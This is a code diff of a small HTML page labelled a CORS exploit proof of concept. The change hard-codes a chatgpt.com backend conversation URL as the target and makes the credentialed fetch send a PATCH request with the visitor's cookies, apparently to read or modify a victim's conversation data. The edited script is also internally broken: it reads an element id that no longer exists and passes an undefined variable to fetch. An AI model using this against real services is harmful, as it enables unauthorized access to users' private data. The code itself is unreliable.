@@ -6,7 +6,8 @@
 </head>
 <body>
   <h2>CORS Exploit PoC</h2>
-  <input type="text" id="target" placeholder="Enter target URL" style="width:300px;">
+  <input type="text" id="targetUrl" value="https://chatgpt.com/backend-api/conversation/68a3761c-bb40-832c-93f6-28c5f63fd214" style="width:100%">
+
   <button onclick="sendReq()">Send GET</button>
   <pre id="output"></pre>
 
@@ -14,7 +15,11 @@
     async function sendReq() {
       let url = document.getElementById("target").value;
       try {
-        let res = await fetch(url, {credentials: "include"});
+        let res = await fetch(target, {
+    method: 'PATCH',
+    credentials: 'include'
+})
+
         let text = await res.text();
         document.getElementById("output").innerText = text;
       } catch (err) {
